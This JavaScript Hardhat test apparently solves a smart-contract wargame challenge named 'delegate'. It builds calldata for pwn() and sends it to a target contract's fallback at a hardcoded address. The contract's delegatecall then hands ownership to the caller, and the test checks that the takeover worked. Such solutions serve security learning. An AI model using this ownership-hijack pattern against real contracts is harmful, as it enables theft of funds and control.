import { ethers } from "hardhat";
import { utils } from "ethers";
import { expect } from "chai";

describe("delegate", function() {
    it("Should solve delegate challenge", async function(){ 
        this.timeout(0);

        // setup & check wallet account 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0);

        // define target abi's necessary parts
        const targetABI = [
            "function owner() public view returns (address)",
        ];
        const targetAddr = "0xD985EF24d69a4A087a30a9924CaDD732AF6C4587";

        let targetCont = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        targetCont = targetCont.connect(eoa);

        const delegateABI = ["function pwn()"];
        const IDelegate = new utils.Interface(delegateABI);
        const msgData = IDelegate.encodeFunctionData('pwn', []);

        // transaction with data falls in fallback function
        let tx = await eoa.sendTransaction({
            from: eoa.address,
            to: targetCont.address,
            data: msgData,
            gasLimit: utils.parseUnits("55555", "wei"), 
        });
        await tx.wait();
        console.log(tx);        

        let owner = await targetCont.owner();
        expect(owner).to.eq(eoa.address);
    });
});